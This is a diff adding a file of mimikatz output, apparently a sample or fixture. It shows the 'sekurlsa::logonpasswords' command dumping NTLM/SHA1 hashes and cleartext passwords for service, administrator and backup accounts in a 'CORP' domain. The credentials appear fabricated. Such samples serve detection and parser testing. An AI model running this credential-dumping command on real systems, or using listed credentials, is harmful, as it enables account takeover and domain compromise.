@@ -1,0 +1,65 @@
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : svc_backup
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 1/14/2026 2:30:15 AM
+SID               : S-1-5-21-3623811015-3361044348-30300820-1104
+	msv :	
+	 [00000003] Primary
+	 * Username : svc_backup
+	 * Domain   : CORP
+	 * NTLM     : a87f3a337d73085c45f9416be5787d86
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	tspkg :	
+	wdigest :	
+	 * Username : svc_backup
+	 * Domain   : CORP
+	 * Password : Backup2024!@#
+	kerberos :	
+	 * Username : svc_backup
+	 * Domain   : CORP.LOCAL
+	 * Password : Backup2024!@#
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 45239 (00000000:0000b0b7)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 1/14/2026 1:15:22 AM
+SID               : S-1-5-21-3623811015-3361044348-30300820-500
+	msv :	
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : CORP
+	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
+	 * SHA1     : 0cb6948805f797bf2a82807973b89537f4adfbe9
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : domain\admin_backup
+	 * Domain   : BACKUP_SERVER
+	 * Password : BackupAdm!n2024
+
+mimikatz # exit
+Bye!
